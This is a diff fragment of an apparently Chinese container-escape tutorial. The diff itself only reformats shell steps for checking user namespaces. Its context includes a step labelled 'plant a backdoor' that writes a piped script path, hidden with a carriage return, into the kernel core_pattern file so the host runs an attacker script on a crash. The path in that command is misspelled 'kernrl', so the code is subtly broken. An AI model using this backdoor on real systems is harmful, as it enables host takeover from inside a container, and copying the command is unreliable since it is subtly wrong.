@@ -40,21 +40,21 @@
 
 > 开启了user namespace的root权限是虚假的，可以通过以下步骤检查，如果出现文件链接则说明开启了user namespace：
 >
-> #进入/proc/目录
+> 进入/proc/目录
 >
-> cd /proc/
+> $cd /proc/
 >
-> #查看当前目录下有哪些文件或目录
+> 查看当前目录下有哪些文件或目录
 >
-> ls
+> $ls
 >
-> #随便进入一个以数字（进程号）命名的目录，比如1
+> 随便进入一个以数字（进程号）命名的目录，比如1
 >
-> cd 1
+> $cd 1
 >
-> #查看ns（Namespace）目录下的内容
+> 查看ns（Namespace）目录下的内容
 >
-> ls -al ns
+> $ls -al ns
 
 **步骤一：植入后门。**`echo -e "| /tmp/.x.py \rcore    " > /proc/sys/kernrl/core_pattern`
 
